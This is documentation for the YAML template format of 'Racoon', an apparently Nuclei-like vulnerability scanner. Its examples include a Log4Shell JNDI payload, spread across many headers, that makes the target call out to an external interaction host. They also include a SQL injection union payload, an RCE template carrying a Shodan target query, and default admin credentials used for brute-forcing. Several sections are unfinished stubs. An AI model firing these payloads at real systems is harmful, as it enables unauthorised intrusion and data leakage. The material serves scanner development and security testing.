# Racoon template

## 1. <a href="#introduction">Introduction</a>
## 2. <a href="#components">Template Components</a>
- <a href="#infor_block"> Info block </a>
- <a href="#infor_block">Requests block </a>
  
  a. <a href="#raw_request"> Raw request </a>
  
  b. <a href="#fuzzing"> Fuzzing module </a>
  
  c. <a href="#operator"> Operator </a>
    - <a href="#matcher"> Matcher </a>
    - <a href="#exposer">Exposer </a>

---
<p id="introduction"> </p>

## 1. **Introduction**
Racoon is based on the perception of using YAML template file as the input for sent, receive and process data from request. One of the main strength of our tool is customizable template. A knowledge user can create their own template suitable with their need. Those template are written by YAML because this language is very human-readable and easy to format.

<p class="components"> </p>

## 2. Template Components

>### 1. **Info block**
   
Info block provides some basic data fields like: id, name, author, severity, description, remediation, tags,... Info block is dynamic fields, user can add their own fields to provide more information about current template. 
Each template has a unique ID for identifier. ID must not contain spaces and another special character.
```
info:
  name: Satellian Intellian Aptus Web <= 1.24 RCE
  author: ritikchaddha
  severity: critical
  description: 'Intellian Aptus Web 1.24 allows remote attackers to execute arbitrary OS commands via the Q field within JSON data to the cgi-bin/libagent.cgi URI. NOTE: a valid sid cookie for a login to the intellian
    default account might be needed.'
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2020-7980
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-7980
    cwe-id: CWE-78
  metadata:
    shodan-query: http.title:"Intellian Aptus Web"
  tags: satellian,rce,cve,cve2020,intellian,aptus
```

<p id="raw_request"> </p>

> ### 2. **Request block**
Multiple requests can be made from only one single template. That
>> **a. Raw request**

Requests block specifies the start of the requests for the template.
```
requests:
```

#### **Method**
<h1 id="test"></h1>
Those request method can be GET, POST, PUT, DELETE,...

```
requests:
  - request: #Method in front of each request
      - |
        GET /?x=${jndi:ldap://${hostName}.uri.{{interactsh-url}}/a} HTTP/1.1
        Host: {{Hostname}}
```

**Redirect**

---

This field decides whether current request can be redirect or not. By default, redirects are not allowed(it brings false value), However, if user want to redirect, it can be turn on with redirects: true.

```
requests:
  - request:
      - |
        POST /admin/?n=language&c=language_general&a=doExportPack HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        appno= 1 union SELECT 98989*443131,1&editor=cn&site=web

    redirects: true
```

**Path**

---

Variables start with {{ and end with }} and are case-sensitive.

```
Full link: https://testpage.com:8081/login/login.php

{{BaseURL}} https://testpage.com:8081/login/login.php

{{RootURL}} https://testpage.com:8081

{{Hostname}} testpage.com:8081

{{Host}} testpage.com

{{Port}} 8081

{{Path}} /login

{{Scheme}} https

{{FullPath}} /login/login.php
```

**Session**

---

#### ~~Dính google~~
**cookie-reuse:true** can be used when user want to maintain session beween series of request to finish the exploit chain and perform authenticated scans.
```
cookie-reuse: true
```
**Request Condition**

---

#### Dính google
When user want to check for condition between multiple requests in order to write complex checks. 
The matcher can be initialized by adding req-condition: true and numbers (most of the time are HTTP respons code) as suffix with respective attributes, status_code_1, status_code_3, andbody_2.


```
req-condition: true
    cookie-reuse: true
    matchers:
      - type: dsl
        dsl:
          - 'status_code_1 == 302 && status_code_2 == 200 && status_code_3 == 200'
          - 'contains(body_2, "[zm_gallery id=")'
          - 'contains(body_2, "<th scope=\"row\" class=\"check-column\">")'
          - '!contains(body_3, "<th scope=\"row\" class=\"check-column\">")'
        condition: and
```

```
info:
  id: CVE-2021-44228
  name: Apache Log4j2 Remote Code Injection
  author: melbadry9,dhiyaneshDK,daffainfo,anon-artist,0xceba,Tea
  severity: critical
  description: Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.
  remediation: Upgrade to Log4j 2.3.1 (for Java 6), 2.12.3 (for Java 7), or 2.17.0 (for Java 8 and later).
  reference:
    - https://logging.apache.org/log4j/2.x/security.html
    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
    - https://github.com/advisories/GHSA-jfh8-c2jp-5v3q
    - https://www.lunasec.io/docs/blog/log4j-zero-day/
    - https://gist.github.com/bugbountynights/dde69038573db1c12705edb39f9a704a
  tags: cve,cve2021,rce,oast,log4j,injection
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.00
    cve-id: CVE-2021-44228
    cwe-id: CWE-502

requests:
  - request:
      - |
        GET /?x=${jndi:ldap://${hostName}.uri.{{interactsh-url}}/a} HTTP/1.1
        Host: {{Hostname}}
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Accept: ${jndi:ldap://${hostName}.accept.{{interactsh-url}}}
        Accept-Encoding: ${jndi:ldap://${hostName}.acceptencoding.{{interactsh-url}}}
        Accept-Language: ${jndi:ldap://${hostName}.acceptlanguage.{{interactsh-url}}}
        Access-Control-Request-Headers: ${jndi:ldap://${hostName}.accesscontrolrequestheaders.{{interactsh-url}}}
        Access-Control-Request-Method: ${jndi:ldap://${hostName}.accesscontrolrequestmethod.{{interactsh-url}}}
        Authentication: Basic ${jndi:ldap://${hostName}.authenticationbasic.{{interactsh-url}}}
        Authentication: Bearer ${jndi:ldap://${hostName}.authenticationbearer.{{interactsh-url}}}
        Cookie: ${jndi:ldap://${hostName}.cookiename.{{interactsh-url}}}=${jndi:ldap://${hostName}.cookievalue.{{interactsh-url}}}
        Location: ${jndi:ldap://${hostName}.location.{{interactsh-url}}}
        Origin: ${jndi:ldap://${hostName}.origin.{{interactsh-url}}}
        Referer: ${jndi:ldap://${hostName}.referer.{{interactsh-url}}}
        Upgrade-Insecure-Requests: ${jndi:ldap://${hostName}.upgradeinsecurerequests.{{interactsh-url}}}
        User-Agent: ${jndi:ldap://${hostName}.useragent.{{interactsh-url}}}
        X-Api-Version: ${jndi:ldap://${hostName}.xapiversion.{{interactsh-url}}}
        X-CSRF-Token: ${jndi:ldap://${hostName}.xcsrftoken.{{interactsh-url}}}
        X-Druid-Comment: ${jndi:ldap://${hostName}.xdruidcomment.{{interactsh-url}}}
        X-Forwarded-For: ${jndi:ldap://${hostName}.xforwardedfor.{{interactsh-url}}}
        X-Origin: ${jndi:ldap://${hostName}.xorigin.{{interactsh-url}}}
        Content-Type: application/json
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol  # Confirms the DNS Interaction
        words:
          - "dns"

      - type: regex
        part: interactsh_request
        regex:
          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${hostName} in output

    extractors:
      - type: kval
        kval:
          - interactsh_ip # Print remote interaction IP in output

      - type: regex
        part: interactsh_request
        group: 2
        regex:
          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print injection point in output

      - type: regex
        part: interactsh_request
        group: 1
        regex:
          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${hostName} in output
```

<p id="fuzzing"></p>

### **HTTP Fuzzing**:
---
Racoon supports running various type of payloads in multiple format. User can perform batteringram, pitchfork and clusterbomb attacks depends on their need. Those wordlists for these attacks needs to be defined during the request definition under the Payload field.

Attack mode:
- batteringram:
  The battering ram attack type places the same payload value in all positions. It uses only one payload set, loops through the payload set and replaces all positions with the payload value.
- pitchfork:
  The pitchfork attack type uses one payload set for each position. It loops through all payload sets at the same time and places the first payload in the first position, the second payload in the second position, and so on.
- clusterbomb:
  The clusterbomb attack tries all different combinations of payload. It still puts the first payload in the first position, and the second payload in the second position. But when it loops through the payload sets, it tries all combinations.
  ==> This attack type is useful for brute-force attack. Load a list of commonly used usernames in the first payload set, and list of commonly used passwords in the second payload set. The cluster bomb attack will then try all combinations.

```
payloads:
      username:
        - admin
      password:
        - axis2
    attack: pitchfork
```

>> **c. Operator**

<p id="matcher"> </p>

### **Matcher**:

---

This field contains different type of comparisons to support analysis responses in any case. Basically, there are 6 type of matchers: status, size, word, regex, dsl, time.

In real case, Word and Regex matchers can be configured later depend on user's needs.

dsl can be used in combination of many elaborate expressions with helper functions to perform matching process.

```
Example
```
content_length - content_length >= 512

status_code - status_code == 403

all_headers, body, raw - len(all_headers) / len(body) / len(user_agent) / len(raw)


Condition: By default, it has value OR. User can decide it's value later.

Matcher condition: Our tool follow both OR and AND operation, user can define those value in their template

```
Example
```


### **Exposer**:

---

Extractors can be used to extract and display results from the match of the response handler.

Our tool support two type of extractors:
- regex - extract data from response based on a Regular Expression
- kval - extract key: value/key=value formatted data from Response Header/Cookie.
- json - extract data from JSON based response in JQ like syntax.
- xpath - extract xpath based data from HTML Response
Example extractor for HTTP Response body using regex.

```
Example REGEX
```

kval example to extract content-type header from HTTP Response.

```
Example KVAL
```

In real case, content-type will be replaced with content_type because kval extractor does not accept dash (-) as input.


A json example to extract value of **name**, **author**, etc.

```
Example JSON
```


A xpath extractor example to extract value from HTML response.

```
example of xpath
```

**Dynamic extractor**

---

Another type of extractor is Dynamic extractor. It can be used to capture Dynamic Values while writing Multi-Request templates. This feature is only available in RAW request format.

```
Example of Dynamic extractor
```


***Note: chưa hoàn thiện.

**OOB Testing**

---

Racoon supports using the interact.sh API to achieve OOB based vulnerability scanning.

**Interactsh Placeholder**

---

**{{interactsh-url}}** placeholder is used in both http and https in network requests.

```
Example of placeholder
```

**Interactsh Matchers**

---

Interactsh interactions can be used with word, regex or dsl matcher/extractor
interactsh_protocol: dns, http, smtp. 
interactsh_request: the request that the interact.sh server received
interactsh_response: the response that the interact.sh server sent to the client

```
Example
```

**Preprocessors**

---

Certain pre-processors can be specified globally anywhere in the template that run as soon as the template is loaded to achieve things like random ids generated for each template run.

**randstr**: Generates a random ID for a template on each nuclei run. This can be used anywhere in the template and will always contain the same value. randstr can be suffixed by a number, and new random ids will be created for those names too. 

randstr is also supported within matchers and can be used to match the inputs.
